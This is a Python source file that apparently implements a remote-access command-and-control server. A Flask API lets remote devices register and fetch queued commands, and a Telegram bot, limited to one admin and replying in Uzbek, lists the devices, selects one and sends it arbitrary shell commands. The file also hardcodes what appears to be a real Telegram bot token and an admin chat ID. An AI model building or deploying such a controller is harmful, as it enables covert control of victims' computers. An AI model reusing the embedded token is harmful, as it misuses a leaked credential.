from threading import Thread
from flask import Flask, request, jsonify
from telegram.ext import Application, CommandHandler

ADMIN_CHAT_ID = 1612270615
BOT_TOKEN = "7754620943:AAESsQB-tTOxNlpgr9yfhieOR5ua4enR5DU"

app = Flask(__name__)

devices = {}
commands = {}
selected_device = {}

@app.route("/hello")
def hello():
    return "Hello World"

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    deviceId = data["deviceId"]
    hostname = data["hostname"]

    devices[deviceId] = {"hostname": hostname}
    if deviceId not in commands:
        commands[deviceId] = []

    return jsonify({"status": "ok"})

@app.route("/get_commands/<device_id>", methods=["GET"])
def get_commands(device_id):
    if device_id in commands:
        cmds = commands[device_id]
        commands[device_id] = []  
        return jsonify({"commands": cmds})
    return jsonify({"commands": []})

async def start(update, context):
    if update.effective_user.id != ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ Siz admin emassiz!")
        return

    await update.message.reply_text(
        "✅ Bot ishlayapti!\n\n"
        "Komandalar:\n"
        "/devices - Qurilmalarni ko‘rish\n"
        "/select <id> - Qurilmani tanlash\n"
        "/command <cmd> - Buyruq yuborish"
    )

async def devices_cmd(update, context):
    if not devices:
        await update.message.reply_text("❌ Qurilma yo‘q.")
        return

    text = "📱 Qurilmalar:\n"
    for d_id, info in devices.items():
        text += f" - {d_id}: {info['hostname']}\n"

    await update.message.reply_text(text)

async def select_cmd(update, context):
    if len(context.args) == 0:
        await update.message.reply_text("❌ Qurilma ID kiriting: /select <id>")
        return

    device_id = context.args[0]
    if device_id not in devices:
        await update.message.reply_text("❌ Bunday qurilma topilmadi.")
        return

    selected_device[update.effective_user.id] = device_id
    await update.message.reply_text(f"✅ Tanlandi: {device_id}")

async def command_cmd(update, context):
    if len(context.args) == 0:
        await update.message.reply_text("❌ Buyruq kiriting: /command <cmd>")
        return

    user_id = update.effective_user.id
    if user_id not in selected_device:
        await update.message.reply_text("❌ Avval /select bilan qurilma tanla")
        return

    device_id = selected_device[user_id]
    cmd = " ".join(context.args)
    commands[device_id].append(cmd)

    await update.message.reply_text(f"📤 Buyruq yuborildi: {cmd}")

def run_flask():
    app.run(host="0.0.0.0", port=4000)

def run_telegram():
    app_tg = Application.builder().token(BOT_TOKEN).build()
    app_tg.add_handler(CommandHandler("start", start))
    app_tg.add_handler(CommandHandler("devices", devices_cmd))
    app_tg.add_handler(CommandHandler("select", select_cmd))
    app_tg.add_handler(CommandHandler("command", command_cmd))
    app_tg.run_polling()

if __name__ == "__main__":
    Thread(target=run_flask, daemon=True).start()
    run_telegram()
